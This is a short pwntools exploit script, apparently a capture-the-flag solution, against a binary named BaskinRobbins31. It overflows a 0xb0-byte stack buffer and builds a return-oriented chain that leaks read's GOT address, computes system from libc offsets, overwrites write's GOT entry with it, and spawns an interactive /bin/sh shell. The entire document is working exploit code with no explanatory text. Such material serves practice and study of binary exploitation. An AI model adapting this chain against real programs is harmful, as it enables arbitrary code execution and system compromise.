from pwn import *

context.log_level = 'debug'

binary = ELF('./BaskinRobbins31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']

bss = binary.bss()

system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

read_system_offset = read_offset - system_offset

pppr = 0x0040087a # pop rdi; pop rsi; pop rdx; ret

payload = 'a'*0xb0 + 'b'*8
payload += p64(pppr) + p64(1) + p64(read_got) + p64(8) + p64(write_plt)
payload += p64(pppr) + p64(0) + p64(bss) + p64(8) + p64(read_plt)
payload += p64(pppr) +p64(0) + p64(write_got) + p64(8) + p64(read_plt)
payload += p64(pppr) + p64(bss) + 'b'*8 + 'c'*8 + p64(write_plt)

p = process('./BaskinRobbins31')

p.recv()
p.sendline(payload)
leak_read = u64(p.recv()[-8:])
log.info('leaked read: ' + hex(leak_read))
leak_system = leak_read - read_system_offset
log.info('leaked system: ' + hex(leak_system))

p.sendline('/bin/sh')
#p.recv()
p.sendline(p64(leak_system))
p.interactive()
